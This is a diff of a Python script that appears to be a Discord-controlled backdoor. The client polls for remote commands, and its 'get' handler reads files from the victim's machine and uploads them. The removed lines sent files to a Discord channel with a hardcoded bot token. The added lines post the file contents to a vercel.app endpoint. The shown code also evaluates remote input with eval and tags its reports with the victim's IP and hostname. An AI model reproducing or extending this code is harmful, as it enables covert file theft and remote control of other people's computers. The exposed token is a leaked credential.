@@ -70,25 +70,17 @@ while True:
                     old_command = ""
                     continue
                 if command.startswith("get "):
-                    token = "OTEyMDExNjQzOTQ3NDc5MDgx.G_0FA6.4NubZfVPRUAiyVEaJiK39i78NCS-nH8RRKYcP4"
-                    channel_id = '1140989222556274721'
-                    url = f'https://discord.com/api/v9/channels/{channel_id}/messages'
+                    print(command)
                     localcmd = command.split()
-                    path = "../" + localcmd[1]
-                    file = open(path, "rb").read()
-                    fileJson = {
-                        "file" : (str(path), open(str(path), 'rb'))
-                    }
-                    payload = {
-                        "content":"message"
-                    }
-                    header = {'Authorization': f'Bot {token}'}
-
+                    path = localcmd[1]
+                    file = [str(path), open(str("../"+path), 'rb').read()]
+                    file = str(file)
                     try:
-                        post(url, data = payload, headers=header, files=fileJson)
+                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data = file)
                     except:
                         pass
                     old_command = commandId
+                    continue
                 if command.startswith("webfile "):
                     localcmd = command.split(maxsplit=1)
                     files = eval(localcmd[1])
@@ -527,6 +519,7 @@ while True:
                     except KeyboardInterrupt:
                         try:
                             post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
+
                         except KeyboardInterrupt:
                                 continue
                         continue
